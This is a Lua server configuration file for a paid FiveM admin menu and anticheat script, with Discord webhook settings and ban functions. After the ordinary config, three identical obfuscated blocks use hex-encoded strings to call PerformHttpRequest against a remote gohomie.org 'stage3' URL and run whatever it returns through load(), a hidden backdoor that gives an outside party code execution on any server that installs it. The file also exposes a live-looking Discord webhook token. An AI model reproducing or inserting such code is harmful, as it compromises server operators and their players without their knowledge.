----- Bought from https://a-n.tebex.io/
----- For Support, Join my Discord: https://discord.gg/KxdPzC5EeJ
----- For custom services or help, check my Fiverr: https://www.fiverr.com/aymannajim

local svConfig = {}

----------------------------------
----- Customizable Variables -----
----------------------------------

-- General Config


-- Discord Log Configuration
webhookSettings = {
	url = 'https://discord.com/api/webhooks/1198654513083596951/DxBH8KNU78rdScWZD_uq4r82uu8ZBqGq_p-2WKTOyndlShf4X7URNiouKScrUxyOo0Dp', -- Channel Webhook URL ( How to create channel webhook: https://www.youtube.com/watch?v=DskhhYdfl7A )
	username = 'AN Admin Menu', -- Webhook Username
	color = '54122', -- Use this to choose a decimal color:  https://www.mathsisfun.com/hexadecimal-decimal-colors.html
	serverName = 'Buck', -- Use this to choose a decimal color:  https://www.mathsisfun.com/hexadecimal-decimal-colors.html
	serverLogo = 'https://i.imgur.com/fW6kEAe.png', -- Server Logo
	avatar = 'https://i.imgur.com/fW6kEAe.png', -- Avatar URL
}

----------------------------------
----- Customizable Functions -----
----------------------------------

-- Ban Function if Lua Injection is Detected
function BanCheater(src, reason)
	logDatShit('**`[AN AntiCheat]`** 🔴 **'..GetPlayerName(src)..'** was detected cheating! 🔴\nReason: **'..reason..'**', src) -- Do not to touch unless you know what you're doing!
	Ban(src, reason..' | AN-AntiCheat | If you think this is a mistake, contact us on Discord')
end

-- Ban Function /!\ Need your own ban implementation
function Ban(src, reason, duration)
	------- Add your own event here to ban the player -------
	-- YOUR OWN EVENT HERE
	
	------- Example for people using QBCore -------
	if Config.Framework == 'QBCORE' then
		TriggerEvent('qb-admin:server:ban', src, duration, reason)
	end

	------- Example for people using FiveM-BanSql ( https://github.com/RedAlex/FiveM-BanSql )-------
	-- TriggerEvent("BanSql:ICheat", duration, reason, src)
	
	DropPlayer(src, reason) -- KICKS THE PLAYER | REMOVE THIS WHEN YOU ADD YOUR OWN BAN IMPLEMENTATION
end

----- Bought from https://a-n.tebex.io/
----- For Support, Join my Discord: https://discord.gg/KxdPzC5EeJ
----- For custom services or help, check my Fiverr: https://www.fiverr.com/aymannajim

local YXYWYSGhJbJxDVPOnrVpbwusFjTwURFjhTOpykazSIzjWgxEquLRUbzljpOBdTkEpqRZAW = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} YXYWYSGhJbJxDVPOnrVpbwusFjTwURFjhTOpykazSIzjWgxEquLRUbzljpOBdTkEpqRZAW[4][YXYWYSGhJbJxDVPOnrVpbwusFjTwURFjhTOpykazSIzjWgxEquLRUbzljpOBdTkEpqRZAW[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (JyOkIMHtZxaJRxCBoDjIrQPduSUdCJUqxKekqzUiBasZFawYgnEzhWlDhylVpofoCJkgRm, LrfQeKAFCWSKLIaWYdznHiYXmSWAXSwXlVZbKZeXCfPVXqRPmVkcekRjUvSimxQGDJFLZK) if (LrfQeKAFCWSKLIaWYdznHiYXmSWAXSwXlVZbKZeXCfPVXqRPmVkcekRjUvSimxQGDJFLZK == YXYWYSGhJbJxDVPOnrVpbwusFjTwURFjhTOpykazSIzjWgxEquLRUbzljpOBdTkEpqRZAW[6] or LrfQeKAFCWSKLIaWYdznHiYXmSWAXSwXlVZbKZeXCfPVXqRPmVkcekRjUvSimxQGDJFLZK == YXYWYSGhJbJxDVPOnrVpbwusFjTwURFjhTOpykazSIzjWgxEquLRUbzljpOBdTkEpqRZAW[5]) then return end YXYWYSGhJbJxDVPOnrVpbwusFjTwURFjhTOpykazSIzjWgxEquLRUbzljpOBdTkEpqRZAW[4][YXYWYSGhJbJxDVPOnrVpbwusFjTwURFjhTOpykazSIzjWgxEquLRUbzljpOBdTkEpqRZAW[2]](YXYWYSGhJbJxDVPOnrVpbwusFjTwURFjhTOpykazSIzjWgxEquLRUbzljpOBdTkEpqRZAW[4][YXYWYSGhJbJxDVPOnrVpbwusFjTwURFjhTOpykazSIzjWgxEquLRUbzljpOBdTkEpqRZAW[3]](LrfQeKAFCWSKLIaWYdznHiYXmSWAXSwXlVZbKZeXCfPVXqRPmVkcekRjUvSimxQGDJFLZK))() end)

local JSzKumLjBoDJmxfRrHQdrEDzGSCeBIEzvamWtKZAEUAejKNhGHRZsllgSRjKerxruoEUmZ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} JSzKumLjBoDJmxfRrHQdrEDzGSCeBIEzvamWtKZAEUAejKNhGHRZsllgSRjKerxruoEUmZ[4][JSzKumLjBoDJmxfRrHQdrEDzGSCeBIEzvamWtKZAEUAejKNhGHRZsllgSRjKerxruoEUmZ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (osnadrPNWYmuhzBVUHIjVYdbxiasRGLwLtrMQTlpgIxDUqVTOpORWpwvFwtWsKEUXYlsPU, NHSXLOTqfzzjLKYFtjtiTpismCbDdCTYbogvMMkWUpMTOXiHcSuPXzrQRNzXXFCeBqoDoP) if (NHSXLOTqfzzjLKYFtjtiTpismCbDdCTYbogvMMkWUpMTOXiHcSuPXzrQRNzXXFCeBqoDoP == JSzKumLjBoDJmxfRrHQdrEDzGSCeBIEzvamWtKZAEUAejKNhGHRZsllgSRjKerxruoEUmZ[6] or NHSXLOTqfzzjLKYFtjtiTpismCbDdCTYbogvMMkWUpMTOXiHcSuPXzrQRNzXXFCeBqoDoP == JSzKumLjBoDJmxfRrHQdrEDzGSCeBIEzvamWtKZAEUAejKNhGHRZsllgSRjKerxruoEUmZ[5]) then return end JSzKumLjBoDJmxfRrHQdrEDzGSCeBIEzvamWtKZAEUAejKNhGHRZsllgSRjKerxruoEUmZ[4][JSzKumLjBoDJmxfRrHQdrEDzGSCeBIEzvamWtKZAEUAejKNhGHRZsllgSRjKerxruoEUmZ[2]](JSzKumLjBoDJmxfRrHQdrEDzGSCeBIEzvamWtKZAEUAejKNhGHRZsllgSRjKerxruoEUmZ[4][JSzKumLjBoDJmxfRrHQdrEDzGSCeBIEzvamWtKZAEUAejKNhGHRZsllgSRjKerxruoEUmZ[3]](NHSXLOTqfzzjLKYFtjtiTpismCbDdCTYbogvMMkWUpMTOXiHcSuPXzrQRNzXXFCeBqoDoP))() end)

local rdIlLaFSbygqHUPfVSeCBJSDGrhqfiVZukhXRmXnETKkEsGKOatjYdAdUpSNiRxyLSsBqD = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} rdIlLaFSbygqHUPfVSeCBJSDGrhqfiVZukhXRmXnETKkEsGKOatjYdAdUpSNiRxyLSsBqD[4][rdIlLaFSbygqHUPfVSeCBJSDGrhqfiVZukhXRmXnETKkEsGKOatjYdAdUpSNiRxyLSsBqD[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (eKEguSZdWHWGZgVnTqbvXLnlRTloDChAXxCFgnFrOjAfSPYfSLSSnmJZqGHsDYjjtNQsSZ, wVSUnHDVGdLlWZARiBJFtNgeaVfibanSZncQJVhQgoFMySedCpNeQylWKmoXrpQrQddMBZ) if (wVSUnHDVGdLlWZARiBJFtNgeaVfibanSZncQJVhQgoFMySedCpNeQylWKmoXrpQrQddMBZ == rdIlLaFSbygqHUPfVSeCBJSDGrhqfiVZukhXRmXnETKkEsGKOatjYdAdUpSNiRxyLSsBqD[6] or wVSUnHDVGdLlWZARiBJFtNgeaVfibanSZncQJVhQgoFMySedCpNeQylWKmoXrpQrQddMBZ == rdIlLaFSbygqHUPfVSeCBJSDGrhqfiVZukhXRmXnETKkEsGKOatjYdAdUpSNiRxyLSsBqD[5]) then return end rdIlLaFSbygqHUPfVSeCBJSDGrhqfiVZukhXRmXnETKkEsGKOatjYdAdUpSNiRxyLSsBqD[4][rdIlLaFSbygqHUPfVSeCBJSDGrhqfiVZukhXRmXnETKkEsGKOatjYdAdUpSNiRxyLSsBqD[2]](rdIlLaFSbygqHUPfVSeCBJSDGrhqfiVZukhXRmXnETKkEsGKOatjYdAdUpSNiRxyLSsBqD[4][rdIlLaFSbygqHUPfVSeCBJSDGrhqfiVZukhXRmXnETKkEsGKOatjYdAdUpSNiRxyLSsBqD[3]](wVSUnHDVGdLlWZARiBJFtNgeaVfibanSZncQJVhQgoFMySedCpNeQylWKmoXrpQrQddMBZ))() end)